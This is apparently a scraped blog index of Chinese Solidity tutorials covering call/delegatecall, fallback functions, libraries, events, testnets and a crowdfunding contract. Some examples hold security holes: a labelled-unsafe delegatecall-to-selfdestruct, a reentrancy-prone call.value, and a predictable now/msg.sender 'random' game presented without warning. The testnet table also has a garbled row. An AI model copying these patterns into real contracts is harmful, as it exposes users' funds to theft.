totalSupply +=mintedAmount; emit Transfer(0,this,mintedAmount); emit Transfer(this,target,mintedAmount); &#125;&#125; 溢出列表 溢出运算列表： 12345678910111213141516171819exception on overflow in unsigned-&gt;signed conversion exception on overflow in signed-&gt;unsigned conversion exception on overflow in size-decreasing implicit conversion exception on overflow in addition of two signed numbers exception on overflow in addition of two unsigned numbers exception on underflow in subtraction of two signed numbers exception on underflow in subtraction of two unsigned numbers exception on overflow in multiplication of two signed numbers exception on overflow in multiplication of two unsigned numbers exception on overflow in shifts exception on overflow in ++ on a signed number exception on overflow in ++ on an unsigned number exception on underflow in -- on a signed number exception on underflow in -- on an unsigned number exception on overflow in += exception on overflow in -= exception on overflow in *= exception on overflow in /= make sure no optimizations are relying on (a + b - b == a); lest they remove overflow exceptions","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[48]-call函数","slug":"solidity-48-call","date":"2018-11-23T14:55:33.000Z","updated":"2018-11-27T15:31:32.805Z","comments":true,"path":"2018/11/23/solidity-48-call/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-48-call/","excerpt":"","text":"调用外部合约的代码 在之前我们已经看到过，使用interface、library的方式调用外部合约的代码。 接下来，我们将为大家补充第三种形式： 在下面的代码中，部署cat合约之后，例如地址为 0x345678.. 在部署animal合约时，传递此cat合约地址。从而能够存储合约的引用。调用test方法即可调用到外部合约的方法。 1234567891011121314151617181920212223pragma solidity ^0.4.23;contract cat&#123; uint public a=5; function eat() public returns(uint)&#123; a = 256; return a; &#125;&#125;contract animal&#123; cat c; constructor(address _addr)&#123; c = cat(_addr); &#125; function test() public returns(uint)&#123; return c.eat(); &#125;&#125; call函数 不管是interface、library还是上面看到的形式，要调用外部代码，都是底层调用了call或者是delecall函数。 call函数基本使用方法 call函数的使用方法，首先需要外部合约的地址。如下例中的animalCall合约，在部署合约时，传递了外部合约cat的地址 0x345678.. ，存储在address c当中。 通过合约地址.call(函数标志符)的方式来调用合约。函数标志符是对于函数声明哈希之后的前4个字节的数据。 如下例中，c.call(bytes4(keccak256(“eat()”)))将调用cat合约中的eat方法 123456789101112131415161718192021contract cat&#123; uint public a=5; function eat() public returns(uint)&#123; a = 256; return a; &#125;&#125;contract animalCall&#123; address c; constructor(address _addr)&#123; c = _addr; &#125; function test1() public returns(bool)&#123; return c.call(bytes4(keccak256(&quot;eat()&quot;))); &#125; function test2() public returns(bool)&#123; return c.call(bytes4(keccak256(&quot;eat&quot;))); &#125;&#125; call函数返回值 call函数的返回值为true或者false。只有当能够找到此方法并执行成功后，会返回true，而如果不能够找到此函数或执行失则会返回false。因此调用test1方法会返回true，调用test2方法会返回false，因为找不到函数。 call 函数与回调函数 call函数如果找不到函数，默认会调用回调函数。 回调函数是特殊的函数，其没有函数名。 其形式为： 123function()&#123;&#125; 对于如下的cat合约。书写了回调函数。假设合约地址为c.那么在外部调用c.call(“abc”);会找不到此函数，默认会执行回调函数.因此在外部调用的c.call(“abc”) 会使得cat合约的状态变量变为999。而且call函数会返回true。 1234567891011121314contract cat&#123; uint public a=5; function eat() public returns(uint)&#123; a = 256; return a; &#125; function ()&#123; a=999; &#125;&#125; call函数与msg.data 回调函数是非常有用的，例如我们可以在外部调用失败的时候，执行某一些操作。 对于如下的cat合约。书写了回调函数。假设合约地址为c.那么在外部调用c.call(“abc”);会找不到此函数，默认会执行回调函数.回调函数中，将msg.data的值赋值给了fail变量。通过getfail函数可查看call函数传递过来的完整数据。fail变量的值为32个字节0x6162630000000000000000000000000000000000000000000000000000000000，前3个字节是参数字母a、b、c的ASCII码。61、62、63. 1234567891011121314pragma solidity ^0.4.23;contract cat&#123; bytes fail; function ()&#123; fail = msg.data; &#125; function getfail() returns(bytes)&#123; return fail; &#125;&#125; call函数修改外部合约的状态变量 在下例中，cat合约与animalcall合约中都有状态变量我们首先部署cat合约，得到地址0x3456..， 接下来，将合约地址作为参数部署anumalCall合约。 调用test2方法，其调用了cat合约的eat方法，修改了cat合约中a的值为256. call函数调用外部合约，修改外部合约中的状态变量。 123456789101112131415161718192021pragma solidity ^0.4.23;contract cat&#123; uint public a=5; function eat() public returns(uint)&#123; a = 256; return a; &#125;&#125;contract animalCall&#123; uint public a=4; address c; constructor(address _addr)&#123; c = _addr; &#125; function test2() public returns(bool)&#123; return c.call(bytes4(keccak256(&quot;eat()&quot;))); &#125;&#125; delegatecall delegatecall函数的使用方法和call函数一样，通过合约地址.delegatecall(函数标志符)的方式来调用合约。函数标志符是对于函数声明哈希之后的前4个字节的数据。 library库的远程调用正是使用了delegatecall函数。delegatecall与call不同之处在于，delegatecall不会修改外部合约中的状态变量，其好像是将外部函数的代码加载到了本地合约中执行。会修改本地合约状态变量的值。 例如下面的代码，首先部署cat合约，得到地址0x3456..， 接下来，将合约地址作为参数部署anumalCall合约。 调用test2方法，其调用了cat合约的eat方法，但是却是修改了animalcall合约中的状态变量a。因此当查询后发现，cat合约中的a并没有变化，animalCall合约变量a变为了了256。 123456789101112131415161718192021pragma solidity ^0.4.23;contract cat&#123; uint public a=5; function eat() public returns(uint)&#123; a = 256; return a; &#125;&#125;contract animalCall&#123; uint public a=4; address c; constructor(address _addr)&#123; c = _addr; &#125; function test2() public returns(bool)&#123; return c.delegatecall(bytes4(keccak256(&quot;eat()&quot;))); &#125;&#125; call函数转账与回调函数细节 call函数可以进行转账，并且是transfer与send的底层函数。call函数转账的使用方法是 地址.call.value(转账金额)() 要注意的是，执行转账的时候，如果转账的地址为合约，并且转账合约中有回调函数。那么将默认会执行回调函数。 但是以太坊为了避免重入攻击，对于transfer与send函数进行了限制。当使用transfer与send函数，回调函数中执行的操作最多不能够超过2300gas。这也就意味着不能够执行转账、赋值等操作，而只能够执行事件触发等操作。 例如下面的代码： 首先部署Receiver合约，得到地址0x3456..，再传递Receiver的地址部署Sender合约。当调用sendMoney方法的时候，为合约地址0x3456..转账的操作会触发回调函数，将状态变量balance的数量增加。但是由于修改状态变量的操作超过了最大2300gas的限制，所以下面的操作不会成功。 1234567891011121314151617pragma solidity ^0.4.23;contract Sender &#123; function sendMoney(address _receiver) payable &#123; _receiver.send(msg.value); &#125;&#125;contract Receiver &#123; uint public balance = 0; function () payable &#123; balance += msg.value; &#125;&#125; call函数能够让上面的操作成功。call函数能够指定gas的限制，超过2300gas限制的约束。 如下例所示： 首先部署Receiver合约，得到地址0x3456..，再传递Receiver的地址部署Sender合约。当调用sendMoney方法转移100wei的时候，为合约地址0x3456..转账的操作会触发回调函数，将状态变量balance的数量增加。由于call函数指定的最大gas限制为20317，所以触发回调函数可以将balance的金额修改为100.但是要注意，正因为此，call函数是危险的底层函数，不能够避免重入攻击的问题。 123456789101112131415pragma solidity ^0.4.23;contract Sender &#123; function send(address _receiver) payable &#123; _receiver.call.value(msg.value).gas(20317)(); &#125;&#125;contract Receiver &#123; uint public balance = 0; function () payable &#123; balance += msg.value; &#125;&#125; 回调函数细节 由于回调函数在转账或者call找不到函数的时候都会触发。因此，需要通过require(msg.data.length == 0)来明确当前的 必须为转账而不是call在调用函数。 12345// 坏的方式function() payable &#123; LogDepositReceived(msg.sender); &#125;// 好的方式function() payable &#123; require(msg.data.length == 0); LogDepositReceived(msg.sender); &#125; delegatecall陷阱与建议 如下例中，如果Worker合约远程调用Destructor合约的dowork方法，其实会销毁Worker合约。导致合约中的所有以太币被销毁。 12345678910111213141516contract Destructor&#123; function doWork() external &#123; selfdestruct(0); &#125;&#125;contract Worker&#123; function doWork(address _internalWorker) public &#123; // unsafe _internalWorker.delegatecall(bytes4(keccak256(&quot;doWork()&quot;))); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[47]-interface","slug":"solidity-47-interface","date":"2018-11-23T14:32:59.000Z","updated":"2018-11-27T15:31:28.802Z","comments":true,"path":"2018/11/23/solidity-47-interface/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-47-interface/","excerpt":"","text":"接口 接口本意是物体之间连接的部位。例如电脑的usb接口可以用来连接鼠标也可以连接U盘和硬盘。因此，使用标准的接口可以极大的拓展程序的功能。在solidity语言中，接口可以用来接受相同规则的合约，实现可更新的智能合约。 接口定义 接口需要有interface关键字，并且内部只需要有函数的声明，不用实现。 只要某合约中有和词接口相同的函数声明，就可以被此合约所接受。 123interface 接口名&#123; 函数声明;&#125; 例子： 123interface animalEat&#123; function eat() public returns(string);&#125; 接口使用 在下面的例子中，定义了cat合约以及dog合约。他们都有eat方法.以此他们都可以被上面的animalEat接口所接收。 12345678910111213141516171819202122232425262728293031323334353637383940contract cat&#123; string name; function eat() public returns(string)&#123; return \"cat eat fish\"; &#125; function sleep() public returns(string)&#123; return \"sleep\"; &#125;&#125;contract dog&#123; string name; function eat() public returns(string)&#123; return \"dog miss you\"; &#125; function swim() public returns(string)&#123; return \"sleep\"; &#125;&#125;interface animalEat&#123; function eat() public returns(string);&#125;contract animal&#123; function test(address _addr) returns(string)&#123; animalEat generalEat = animalEat(_addr); return generalEat.eat(); &#125;&#125; 在合约animal中，调用函数test，如果传递的是部署的cat的合约地址，那么我们在调用接口的eat方法时，实则调用了cat合约的eat方法。 同理，如果传递的是部署的dog的合约地址，那么我们在调用接口的eat方法时，实则调用了dog合约的eat方法。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity[46]-随机数与事件","slug":"solidity-46-random","date":"2018-11-23T13:43:53.000Z","updated":"2018-11-23T14:38:14.830Z","comments":true,"path":"2018/11/23/solidity-46-random/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-46-random/","excerpt":"","text":"随机数 solidity语言中提供了内置的哈希函数keccak256来产生随机数。 由于哈希函数的特点，产生的哈希值随着传递参数值与数量的不同而不同。 keccak256函数特性 1、可以传递多了参数,多种类型的值例如：keccak256(1,2,“jonson”,0x32); 2、keccak256的返回值是bytes32类型，意味着其返回值是一个256位的随机数。 3、一般，我们使用全局属性，例如时间now,msg.sender,block.number等全局属性来构造随机数。 随机数案例 构造一个游戏，有70%的概率赢下游戏。 如下函数，通过时间来构造随机数。首先将bytes32类型强制的转换为uint256类型。 取模操作，uint256(keccak256(now,msg.sender)) % 100在0-100之间均匀分布，因此小于70的概率位70%。 从而有70%的可能性会返回正确结果。 12345function test() returns(bool)&#123; if(uint256(keccak256(now,msg.sender)) % 100 &lt; 70)&#123; return true; &#125; &#125; 事件 事件 是dapp程序和区块链通讯的一种机制。你的前端应用“监听”某些事件，并做出反应。 例子: 12345678910111213// 这里建立事件event IntegersAdded(uint x, uint y, uint result);function add(uint _x, uint _y) public &#123; uint result = _x + _y; //触发事件，通知app IntegersAdded(_x, _y, result); return result;&#125;你的 app 前端可以监听这个事件。JavaScript 实现如下:YourContract.IntegersAdded(function(error, result) &#123; // 干些事&#125; 事件例子 如上面的游戏合约中，赢下游戏就会触发事件 12345678910pragma solidity ^0.4.23;contract random&#123; event eve(string); function test() returns(bool)&#123; if(uint256(keccak256(now,msg.sender)) % 100 &lt; 70)&#123; emit eve(\"win\"); return true; &#125; &#125;&#125; 事件本质 触发后的事件记录会存储在区块链上。 当触发事件后，在remix控制台之上会出现事件的记录。 from：代表合约地址 topic：代表的是事件的唯一标示，其本质也是hash函数，如在此例子中，为keccak256（eve(string)）的结果。 event：代表事件的名字 args：参数以及长度 1234567891011[ &#123; &quot;from&quot;: &quot;0x692a70d2e424a56d2c6c27aa97d1a86395877b3a&quot;, &quot;topic&quot;: &quot;0xb753f213c434015869c7cc20def5e88c589e415518548d45d73ebbc2e4ea2ba2&quot;, &quot;event&quot;: &quot;eve&quot;, &quot;args&quot;: &#123; &quot;0&quot;: &quot;win&quot;, &quot;length&quot;: 1 &#125; &#125;] 完整代码 12345678910111213141516171819202122pragma solidity ^0.4.23;contract random&#123; event eve(string); function test() returns(bool)&#123; if(uint256(keccak256(now,msg.sender)) % 100 &lt; 70)&#123; emit eve(&quot;win&quot;); return true; &#125; &#125; function test2() returns(bytes32)&#123; emit eve(&quot;win&quot;); return keccak256(&quot;eve(string)&quot;); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[45]-library库","slug":"solidity-45-library","date":"2018-11-23T10:04:31.000Z","updated":"2018-11-23T14:39:42.569Z","comments":true,"path":"2018/11/23/solidity-45-library/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-45-library/","excerpt":"","text":"library引入 常常，我们会进行加减乘除的操作，如下的函数就是对两个函数参数进行了四则运算。 123456function operate(uint a, uint b) pure returns(uint,uint,uint,uint)&#123; uint add = a+b; uint sub = a-b; uint mul = a*b; uint div = a/b;&#125; library库 上面的函数其实是有问题的，因为它不能够避免出错，例如如果为b传递为0，就会报错。并且没有防止溢出攻击的问题。有很多时候，对于一些基础性的操作，我们可以把他们封装起来，这就是library库的作用。 library的定义 如下例所示，就是上面4则运算使用的library库，对于溢出等进行了问题规避。 library库中，不能包含状态变量、 12345678910111213141516171819202122232425262728library SafeMath&#123; function mul(uint a,uint b) pure returns(uint)&#123; uint c = a*b; assert(c/a==b); return c; &#125; function div(uint a,uint b) pure returns(uint)&#123; uint c = a/b; assert(a== b*c +a%b); return c; &#125; function sub(uint a,uint b) pure returns(uint)&#123; assert(a&gt;=b); return a-b; &#125; function add(uint a,uint b) pure returns(uint)&#123; uint c = a+b; assert(c&gt;=a); return c; &#125;&#125; library库的使用 直接使用库函数中的函数。 12345678function operate(uint a,uint b) pure returns(uint,uint,uint,uint)&#123; uint jia = SafeMath.add(a,b); uint jian = SafeMath.sub(a,b); uint cheng =SafeMath.mul(a,b); uint chu = SafeMath.div(a,b); return(jia,jian,cheng,chu); &#125; 方式2:使用 using SafeMath for uint之后，可以调用库函数。例如a.add(b) 意味着 执行了safemath库中的 add(a,b) 12345678 using SafeMath for uint;function operate2(uint a,uint b) pure returns(uint,uint,uint,uint)&#123; uint jia = a.add(b); uint jian = a.sub(b); uint cheng =a.mul(b); uint chu = a.div(b); return(jia,jian,cheng,chu); &#125; library库深入机制 使用library，底层是使用了delegatecall来远程的调用另外一个合约的代码。只有在某些极少数的情况下，并不是使用了远程调用，而是编译器直接将library库的代码嵌套进了合约中。 例如：下面的例子中，library库中的代码全是pure类型，并且使用了SafeMath.add的方式来调用合约，因此，在编译的时候，会直接将library库的add方法加载到合约中。 123456789101112131415161718pragma solidity 0.4.23;library SafeMath&#123; function add(uint a,uint b) pure returns(uint)&#123; uint c = a+b; assert(c&gt;=a); return c; &#125;&#125;contract math&#123; function operate(uint a,uint b) returns(uint)&#123; uint jia = SafeMath.add(a,b); return(jia); &#125;&#125; 当library库中，有this关键字，函数参数中有storage属性，或者使用了using SafeMath for uint来调用library库的时候，会使用到远程的library库。 下面的例子，编译器都会需要外部的一个library库的地址，从而能够远程调用到library合约。 123456789101112131415161718pragma solidity 0.4.23;library SafeMath&#123; function add(uint a,uint b) pure returns(uint)&#123; uint c = a+b; assert(c&gt;=a); return c; &#125;&#125;contract math&#123; using SafeMath for uint; function operate(uint a,uint b) returns(uint)&#123; uint jia = a.add(b); return(jia); &#125;&#125; 编译math合约的时候，其二进制代码如下： 1&quot;608060405234801561001057600080fd5b5061017c806100206000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063db17ebcd14610046575b600080fd5b34801561005257600080fd5b5061007b6004803603810190808035906020019092919080359060200190929190505050610091565b6040518082815260200191505060405180910390f35b6000808373__browser/test6.sol:SafeMath____________63771602f79091856040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808381526020018281526020019250505060206040518083038186803b15801561010957600080fd5b505af415801561011d573d6000803e3d6000fd5b505050506040513d602081101561013357600080fd5b8101908080519060200190929190505050905080915050929150505600a165627a7a7230582006c538588770740653d6eba03016e0ef64c5da4f370291bdb71ea916cfbf166a0029&quot; 注意到，在此二进制代码中，有一段预留的标识符，其是__browser/test6.sol:SafeMath____________.这一段预留的标识符就是远程library库的地址。 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657pragma solidity 0.4.23;library SafeMath&#123; function mul(uint a,uint b) pure returns(uint)&#123; uint c = a*b; assert(c/a==b); return c; &#125; function div(uint a,uint b) pure returns(uint)&#123; uint c = a/b; assert(a== b*c +a%b); return c; &#125; function sub(uint a,uint b) pure returns(uint)&#123; assert(a&gt;=b); return a-b; &#125; function add(uint a,uint b) pure returns(uint)&#123; uint c = a+b; assert(c&gt;=a); return c; &#125;&#125;contract math&#123; using SafeMath for uint; function operate(uint a,uint b) returns(uint,uint,uint,uint)&#123; uint jia = SafeMath.add(a,b); uint jian = SafeMath.sub(a,b); uint cheng =SafeMath.mul(a,b); uint chu = SafeMath.div(a,b); return(jia,jian,cheng,chu); &#125; function operate2(uint a,uint b) returns(uint,uint,uint,uint)&#123; uint jia = a.add(b); uint jian = a.sub(b); uint cheng =a.mul(b); uint chu = a.div(b); return(jia,jian,cheng,chu); &#125;&#125; 复杂library例子 下例中，CounterContract合约 使用了CounterLib库中的结构体构建了自己的结构体变量counter。并调用了CounterLib库中的方法，实现了counter中i加一的操作。 12345678910111213141516171819pragma solidity ^0.4.23;library CounterLib &#123; struct Counter &#123; uint i; &#125; function incremented(Counter storage self) returns (uint) &#123; return ++self.i; &#125;&#125;contract CounterContract &#123; using CounterLib for CounterLib.Counter; CounterLib.Counter counter;// struct Counter &#123; uint i; &#125; function increment() returns (uint) &#123; return counter.incremented(); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[44]-以太坊测试网络与metamask","slug":"solidity-44-test-network","date":"2018-11-23T09:06:35.000Z","updated":"2018-12-03T10:09:21.010Z","comments":true,"path":"2018/11/23/solidity-44-test-network/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-44-test-network/","excerpt":"","text":"测试网络 在之前的案例中，大部分都是在remix在线的本地虚拟环境下做的测试。这一小节将在以太坊测试网络中交互合约。 除了主网、以太坊有多个测试网络，用于对于智能合约进行测试。那么之间的主要区别在于共识算法以及确认时间。 网络 网络id 共识算法 确认时间 Main 1 POW 15秒左右 Ropsten 3 POW 不到30秒 Ropsten 4 POA 仅geth支持 15秒 kovan 42 POA 仅parity支持 4秒 remix部署智能合约到测试网络的流程 1、书写智能合约 2、solc编译器编译合约为二进制文件与ABI接口文件 3、借助于web3j库将二进制文件部署到智能合约。 4、借助于web3j库于ABI接口于网络进行交互 metamask 在浏览器中，我们需要借助于metamask与以太坊网络进行交互。metamask是一个谷歌浏览器的插件，其可以管理账户，并在浏览器与以太坊网络之间起到架接的作用。 其存储私钥但是只是将数据签名后的信息传播，所以并不会将私钥传播到互联网上。其本质是在浏览器中注入了web3的库，利用web3j实现与以太坊网络的交互 测试网络之间的关系 相同的外部地址和合约地址可以同时存在于不同的测试网络中，但是可能有不同的以太币，不同的部署代码。这是由于测试网络之间本身互不影响。 助记词（Mneminic） 在安装metamask的时候，会有12个助记词。助记词的作用是为了方便进行账户的管理。想象一下当你有多个账户，不同的账户可能处理不同的业务。例如消费、存储、商业活动。我们如果每一个账户都需要把私钥存储起来，那就太费劲了。因此我们使用了12个助记词来帮助我们管理账户。12个助剂词，根据以太坊bip39算法，可以对应着10多个账户的私钥。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[43]-众筹案例","slug":"solidity-43-campaign","date":"2018-11-23T08:49:59.000Z","updated":"2018-11-23T13:00:00.454Z","comments":true,"path":"2018/11/23/solidity-43-campaign/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-43-campaign/","excerpt":"","text":"综合案例：众筹 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354pragma solidity ^0.4.23;contract campaign&#123; //捐赠者的对象 struct funder&#123; address funderaddress; //捐赠者的地址 uint Tomoney; //捐赠者捐赠的金钱 &#125; //受益人的对象 struct needer&#123; address Neederaddress; //受益人的地址 uint goal;//受益人的目标值 uint amount; //当前的已经募集到了多少钱 uint funderAcoount; //捐赠者的id mapping(uint =&gt; funder) map; //映射，将捐赠者的id与捐赠者绑定在一起，从而能够得知，是谁给当前的受益人捐钱了。 &#125; uint neederAmount; //受益人的id数 mapping(uint=&gt; needer) needmap; //通过mapping将受益人的id与受益人绑定在额一起，从而能够能耗的管理受益人 //实现一个众筹的事件 function NewNeeder(address _Neederaddress, uint _goal )&#123; //将受益人id与受益人绑定 neederAmount++; needmap[neederAmount] = needer(_Neederaddress,_goal,0,0); &#125; //@param _address 捐赠者的地址 ， //@param _neederAmount 受益人的id function contribute( address _address, uint _neederAmount) payable&#123; //通过id获取到受益人对象 needer storage _needer = needmap[_neederAmount]; //聚集到的资金增加 _needer.amount += msg.value; // 捐赠人数增加 _needer.funderAcoount++; //将受益人id与受益人绑定 _needer.map[ _needer.funderAcoount] = funder(_address , msg.value ); &#125; //当募集到的资金满足条件，就会给给受益人的地址转账 //@param _neederAmount 受益人的id function ISconpelete( uint _neederAmount)&#123; needer storage _needer = needmap[_neederAmount]; if(_needer.amount &gt;=_needer.goal )&#123; _needer.Neederaddress.transfer(_needer.amount); &#125; &#125; function test() view returns(uint,uint,uint)&#123; return (needmap[1].goal, needmap[1].amount,needmap[1].funderAcoount); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[42]-memory与storage相互转换","slug":"solidity-42-memory-storage","date":"2018-11-23T08:22:55.000Z","updated":"2018-11-23T12:59:43.753Z","comments":true,"path":"2018/11/23/solidity-42-memory-storage/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-42-memory-storage/","excerpt":"","text":"memory 赋值 状态变量 下面的例子说明了memory赋值给storage的情况。在test函数中，memory空间的变量s复制给了状态变量stu。为值的拷贝问题。并且由于这两个空间互不影响。因此修改变量的值不会影响到另一个变量的值。 当调用call函数时，返回100，&quot;jonson&quot;。s的修改不会影响变量stu。 123456789101112131415161718192021222324pragma solidity ^0.4.23;contract MemoryTostorage&#123; struct student&#123; uint grade; string name; &#125; student stu; function test(student memory s) internal&#123; stu = s; s.name = \"alice\"; &#125; function call() returns(uint,string)&#123; student memory guy = student(100,\"jackson\"); test(guy); return (stu.grade,stu.name); &#125;&#125; storage 赋值 memory 如下例，说明了storage复制给结构体 memory变量的情况。在test函数中，其实质是将s引用的状态变量的值赋值给了guy。 变量guy不是存储的引用，而是一个结构体空间。当调用call函数时，返回100，&quot;jonson&quot;。对于guy的修改不会影响到stu的修改。 123456789101112131415161718192021contract storageToMemory&#123; struct student&#123; uint grade; string name; &#125; student stu = student(100,\"jackson\");function test(student storage s) internal&#123; student memory guy = s; guy.grade = 50;&#125;function call() public returns(uint,string)&#123; test(stu); return (stu.grade,stu.name);&#125; memory 转 memory memory与memory之间的相互转换是值传递。 在下面的例子中，当调用call函数时，在memory中开辟了结构体的三个实例空间a、b、c。赋值为值的拷贝。他们之间互不影响。 修改一个变量不会影响其他变量的值。 1234567891011121314151617181920pragma solidity ^0.4.23;contract memoryTomemory&#123; struct student&#123; uint grade; string name; &#125; function test(student memory b) internal&#123; student memory c = b; c.name = \"jonson\"; &#125; function call() returns(string)&#123; student memory a = student(100,\"olaya\"); test(a); return a.name; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[41]-structdeep","slug":"solidity-41-structdeep","date":"2018-11-23T02:56:59.000Z","updated":"2018-11-23T12:59:38.809Z","comments":true,"path":"2018/11/23/solidity-41-structdeep/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-41-structdeep/","excerpt":"","text":"结构体中的mapping ###定义时，不用初始化mapping 1、结构体中的变量，在定义的时候是不能缺省的，但是结构体中的mapping映射除外。 2、在memory中的结构体变量s是不能够操作其中mapping映射。这是由于mapping映射只能够存储在storage空间中 1234567struct student&#123; uint grade; string name; mapping(uint=&gt;string) map; &#125;student memory s = student(100,&quot;jonson&quot;); //初始化不用管mapping// s.map[2] = &quot;alice&quot;;错误，mapping映射只能够存储在storage空间中 3、要想操作结构体中的mapping映射，那么必须要将结构体定义为状态变量。 如下面的例子中，定义了状态变量 student stu。因此可以操作其mapping映射。 下例中的变量guy在栈中，对于guy的操作视同于对于状态变量stu的操作。 12345678910111213141516171819202122232425262728contract structdeep&#123; struct student&#123; uint grade; string name; mapping(uint=&gt;string) map; &#125; student stu; function init() public view returns(string)&#123; student memory s = student(100,\"jonson\"); //将memory中 结构体s的值赋值给状态变量中的stu。 stu = s; //操作mapping映射 stu.map[2] = \"alice\"; //引用 student storage guy = stu; guy.map[2] = \"bob\"; return stu.map[2]; &#125; 带参数结构体与memory 函数参数为结构体时，由于函数参数是在memory的空间中，因此默认时memory属性。必须要用memroy来接受，不能使用storage类型来接受。 123456789struct student&#123; uint grade; string name;&#125;function structParam(student s) internal&#123; student memory guy = s;&#125; 错误写法： 123456789struct student&#123; uint grade; string name;&#125;function structParam(student s) internal&#123; student guy = s;&#125; 错误写法2： 12345678struct student&#123; uint grade; string name;&#125;function structParam(student s) internal&#123; student storage guy = s;&#125; 函数参数为结构体引用 如果希望使用到storage来接受，那么需要强制为参数加上storage属性。这时，传递的参数必须是状态变量。 12345678910function structParam2(student storage s) internal&#123; student storage guy = s; guy.grade = 1000;&#125;function call() public returns(uint)&#123; structParam2(stu); return stu.grade;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[40]-memory属性","slug":"solidity-40-memory","date":"2018-11-23T02:40:22.000Z","updated":"2018-11-23T12:59:31.787Z","comments":true,"path":"2018/11/23/solidity-40-memory/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-40-memory/","excerpt":"","text":"memory引入 函数中结构体变量默认是是storage类型 下面是一段错误的代码，错误的原因在于，init函数中，student s 默认会加上storage的属性，但是storage属性必须要引用storage空间中的状态变量。但是实例化的student(100,“jackson”)并不在storage中。 123456789struct student&#123; uint grade; string name; &#125;function init() public pure returns(uint,string)&#123; student s = student(100,&quot;jackson&quot;); return (s.grade,s.name); &#125; 因此，正确的做法是，必须要变量的初始化放在memory空间中。加上了memory属性的变量，意味着变量存储在memory的空间中。 123456789struct student&#123; uint grade; string name; &#125;function init() public pure returns(uint,string)&#123; student memory s = student(100,&quot;jackson&quot;); return (s.grade,s.name); &#125;","categories":[{"name":"智能合约 